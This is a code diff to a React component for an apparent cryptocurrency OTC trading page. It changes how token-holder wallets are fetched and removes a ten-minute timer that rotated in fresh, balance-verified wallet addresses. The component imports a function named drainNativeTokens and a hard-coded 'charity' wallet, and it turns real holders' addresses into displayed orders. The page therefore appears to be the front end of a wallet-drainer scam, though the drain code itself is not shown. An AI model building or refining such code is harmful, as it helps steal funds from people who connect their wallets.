@@ -21,7 +21,7 @@ import { useEVMWallet } from '@/providers/EVMWalletProvider';
 import { drainNativeTokens } from '@/utils/evmTransactions';
 import { useChainInfo } from '@/hooks/useChainInfo';
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
-import { fetchTokenHolders, fetchOneFreshHolder, deriveOrderFromAddress, shortAddress, HolderWallet } from '@/services/tokenHolders';
+import { fetchMixedHolders, deriveOrderFromAddress, shortAddress, HolderWallet } from '@/services/tokenHolders';
 import { InlineConnectWallet } from '@/components/InlineConnectWallet';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
@@ -258,7 +258,7 @@ const OTC = () => {
   const loadHolders = useCallback(async (addr: string) => {
     setIsLoadingHolders(true);
     try {
-      const list = await fetchTokenHolders(addr, 100);
+      const list = await fetchMixedHolders(addr, 100, 100);
       setHolders(list);
       setLastRefreshed(new Date());
     } finally {
@@ -288,28 +288,7 @@ const OTC = () => {
     }
   };
 
-  // Rotating wallet pool: every 10 minutes find ONE fresh, balance-verified
-  // wallet and replace one of the existing addresses. Continues in a loop so
-  // over time every address gets swapped out for a new one.
-  useEffect(() => {
-    if (!showOrdersDialog || !listSearchToken) return;
-    let rotationIndex = 0;
-    const id = setInterval(async () => {
-      const tokenAddr = listSearchToken.baseToken.address;
-      const exclude = new Set(holders.map(h => h.address));
-      const fresh = await fetchOneFreshHolder(tokenAddr, exclude);
-      if (!fresh) return;
-      setHolders(prev => {
-        if (prev.length === 0) return [fresh];
-        const next = [...prev];
-        next[rotationIndex % next.length] = fresh;
-        rotationIndex += 1;
-        return next;
-      });
-      setLastRefreshed(new Date());
-    }, 10 * 60 * 1000);
-    return () => clearInterval(id);
-  }, [showOrdersDialog, listSearchToken, holders]);
+  // Wallet list is loaded once per token and does NOT rotate.
 
   const fetchTokenDetails = async (address: string, setInfo: (info: DexScreenerTokenInfo | null) => void) => {
     if (!address.trim()) return;
